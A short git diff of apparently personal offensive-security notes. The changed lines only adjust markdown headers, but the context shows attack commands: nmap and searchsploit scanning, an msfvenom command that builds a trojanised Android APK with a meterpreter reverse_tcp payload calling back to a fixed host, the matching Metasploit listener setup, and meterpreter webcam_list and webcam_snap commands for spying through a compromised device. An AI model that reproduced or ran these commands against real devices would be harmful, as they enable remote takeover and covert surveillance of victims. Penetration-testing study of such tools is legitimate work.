@@ -1,6 +1,6 @@
-# OffSec  
+## OffSec  
   
-## Network Analysis  
+### Network Analysis  
 
 nmap -sn 192.168.1.*  
 nmap {ips} -A -oX hosts.xml  
@@ -12,7 +12,7 @@ searchsploit --nmap hosts.xml --json | tee router_hosts.json
 - Wireshark deauth packages:  
 wlan.fc.type_subtype == 12  
 
-## MSF 101  
+### MSF 101  
 
 msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
   
@@ -26,7 +26,7 @@ set LHOST 192.168.110.126
 set LPORT 4444  
 exploit  
   
-## MSF  
+### MSF  
 
 ddbb:  
 systemctl start postgresql  
@@ -79,7 +79,7 @@ Meterpreter:
 webcam_list  
 webcam_snap  
   
-## Exploit i.e  
+### Exploit i.e  
 
 nmap -v -T4 -A -oA nmap_scans/%D.xml  
 sudo chown -R username nmap_scans/*.xml  
